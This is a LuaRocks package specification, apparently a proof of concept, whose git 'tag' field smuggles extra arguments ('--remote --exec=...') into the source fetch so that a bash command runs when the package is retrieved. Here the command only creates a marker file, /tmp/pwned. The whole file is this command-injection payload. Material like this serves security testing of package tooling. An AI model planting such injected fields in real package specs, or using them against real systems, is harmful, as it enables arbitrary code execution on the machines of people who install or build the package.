package = "appsec"
version = "0.1-1"
source = {
   url = "git+https://github.com/lua/lua.git",
   tag = "origin/main --remote --exec=\"/bin/bash echo 'Pwned as $(touch /tmp/pwned)'\""
}
